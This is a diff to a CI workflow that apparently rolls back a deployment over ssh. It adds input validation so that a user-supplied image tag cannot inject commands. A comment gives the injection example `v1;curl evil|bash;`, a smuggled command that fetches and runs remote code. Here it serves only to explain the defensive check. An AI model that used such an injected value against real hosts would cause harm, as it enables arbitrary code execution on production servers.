@@ -58,6 +58,16 @@ jobs:
           GHCR_TOKEN: ${{ secrets.GHCR_PAT }}
           TARGET: ${{ github.event.inputs.image_tag }}
         run: |
+          # Validate before the tag reaches an ssh argument. ssh runs its
+          # command argument remotely as `bash -c "<string>"`, so an
+          # unvalidated `v1;curl evil|bash;` would be arbitrary code execution
+          # on the production host. Blank is legal and means "PREVIOUS from
+          # .release-state" -- rollback.sh's own default.
+          if [[ -n "${TARGET}" && ! "${TARGET}" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then
+            echo "ERROR: refusing rollback tag '${TARGET}'" >&2
+            exit 1
+          fi
+
           # The login is its own ssh call with the token on STDIN: ssh runs its
           # command argument remotely as `bash -c "<string>"`, so a token
           # inlined there would sit in the server's process table.
